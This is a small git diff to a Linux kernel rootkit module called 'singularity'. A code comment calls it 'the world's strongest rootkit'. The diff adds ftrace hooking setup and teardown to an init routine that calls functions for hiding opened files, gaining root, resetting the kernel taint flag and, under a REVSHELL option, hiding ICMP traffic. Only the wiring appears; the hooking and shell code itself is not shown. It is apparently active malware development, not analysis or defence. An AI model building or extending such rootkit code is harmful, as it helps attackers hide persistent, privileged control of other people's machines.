@@ -14,6 +14,7 @@
 #include "include/bpf_hook.h"
 #include "include/icmp.h"
 #include "include/trace.h"
+#include "ftrace/ftrace_helper.h"
 
 /*
 You loaded the world's strongest rootkit into my heart... woman, you are so beautiful and gentle, you changed my life, I love you <3
@@ -22,7 +23,7 @@ More love and less war
 */
 
 static int __init singularity_init(void) {
-    int ret = 0;
+    int ret = fh_initialize();
     ret |= reset_tainted_init();
     ret |= hiding_open_init();
     ret |= become_root_init();
@@ -62,6 +63,7 @@ static void __exit singularity_exit(void) {
 #ifdef REVSHELL
     hiding_icmp_exit();
 #endif
+    fh_shutdown();
 }
 
 module_init(singularity_init);
